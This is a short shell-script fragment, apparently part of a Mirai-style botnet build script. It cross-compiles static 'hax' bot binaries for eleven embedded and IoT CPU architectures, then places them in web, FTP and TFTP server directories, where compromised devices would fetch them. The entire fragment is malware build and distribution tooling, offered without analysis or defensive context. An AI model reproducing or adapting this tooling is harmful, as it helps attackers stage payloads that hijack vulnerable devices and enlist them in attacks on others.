...
compile_bot i586 hax.x86 "-static $flags"
compile_bot mips hax.mips "-static $flags"
compile_bot mipsel hax.mpsl "-static $flags"
compile_bot armv4l hax.arm "-static $flags"
compile_bot armv5l hax.arm5 "-static $flags"
compile_bot armv6l hax.arm6 "-static $flags"
compile_bot armv7l hax.arm7 "-static $flags"
compile_bot powerpc hax.ppc "-static $flags"
compile_bot sparc hax.spc "-static $flags"
compile_bot m68k hax.m68k "-static $flags"
compile_bot sh4 hax.sh4 "-static $flags"

cp release/hax.* /var/www/html/bins
cp release/hax.* /var/ftp
mv release/hax.* /var/lib/tftpboot
rm -rf release
